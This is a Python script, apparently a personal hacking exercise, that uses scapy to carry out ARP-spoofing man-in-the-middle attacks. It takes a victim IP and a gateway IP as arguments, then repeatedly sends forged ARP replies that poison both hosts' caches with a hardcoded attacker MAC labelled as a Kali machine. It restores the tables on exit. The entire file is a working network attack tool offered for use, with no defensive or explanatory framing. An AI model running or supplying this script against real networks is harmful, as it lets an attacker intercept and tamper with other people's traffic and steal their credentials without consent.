
from scapy.all import *
import time
import argparse


def get_mac(ip):
    # get mac from ip
    ans, _ = arping(ip)  # returns 2 lists

    for sent, recv in ans:
        mac = recv[Ether].src
        return mac


def arp_spoof(ip_to_spoof, pretend_ip):
    # create a ARP packet
    arp_response = ARP()

    # print(arp_response.show())

    # now modify the packet
    arp_response.op = 2  # now it is a response
    arp_response.pdst = ip_to_spoof  # victim IP
    arp_response.hwdst = get_mac(ip_to_spoof)  # victim MAC
    print(arp_response.hwdst)
    arp_response.hwsrc = "e8:b1:fc:0a:92:af"  # my kali MAC

    arp_response.psrc = pretend_ip  # 192.168.43.248 is the actual val

    # print(arp_response.show())

    # sending the packet to the victim
    send(arp_response)


def restore_arp_table(src, dst):
    arp_response = ARP()

    arp_response.op = 2  # now it is a response
    arp_response.pdst = dst  # victim IP
    arp_response.hwdst = get_mac(dst)  # victim MAC
    arp_response.hwsrc = get_mac(src)  # my kali MAC

    arp_response.psrc = src

    # sending the packet to the victim
    send(arp_response, count=10)


def parse_user_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t", "--target", help="Provide the victim IP", required=True)
    parser.add_argument("-g", "--gateway",
                        help="Provide the ROuter or Gateway IP", required=True)

    args = vars(parser.parse_args())
    return args


if __name__ == "__main__":
    args = parse_user_arguments()

    victim_ip = args['target']
    gateway_ip = args['gateway']

    try:
        while True:
            arp_spoof(victim_ip, gateway_ip)  # spoofing vicitm
            arp_spoof(gateway_ip, victim_ip)  # spoofing router
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Exiting and restoring ARP tables...")
        restore_arp_table(victim_ip, gateway_ip)
        restore_arp_table(gateway_ip, victim_ip)
